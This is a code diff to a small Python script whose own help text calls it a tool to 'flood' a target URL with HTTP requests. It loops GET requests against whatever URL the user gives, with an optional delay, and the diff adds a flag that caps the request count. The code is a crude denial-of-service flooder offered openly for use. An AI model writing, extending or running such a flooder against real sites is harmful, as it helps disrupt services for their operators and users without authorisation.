@@ -11,6 +11,7 @@ time = 0
 parser = argparse.ArgumentParser(description="./main.py -u [url]")
 parser.add_argument("-u", help="HTTP requests to flood", action="store", dest="url")
 parser.add_argument("-d", help="Delay (in seconds) between requests", action="store", dest="time", type=int)
+parser.add_argument("-l", help="Send only passed number requests", action="store", dest="limit", type=int)
 
 args = parser.parse_args()
 
@@ -31,6 +32,7 @@ if args.time:
         sys.exit()
 
 
+
 print("                  __ _                 _ ")
 print("                 / _| |               | |")
 print("  _ __ ___  __ _| |_| | ___   ___   __| |")
@@ -45,6 +47,8 @@ print("Target url: " + _url + "\n")
 
 
 while True:
+    if requests_counter == args.limit:
+        break
     requests.get(_url)
     requests_counter += 1
     print("Sended " + str(requests_counter) + " requests")
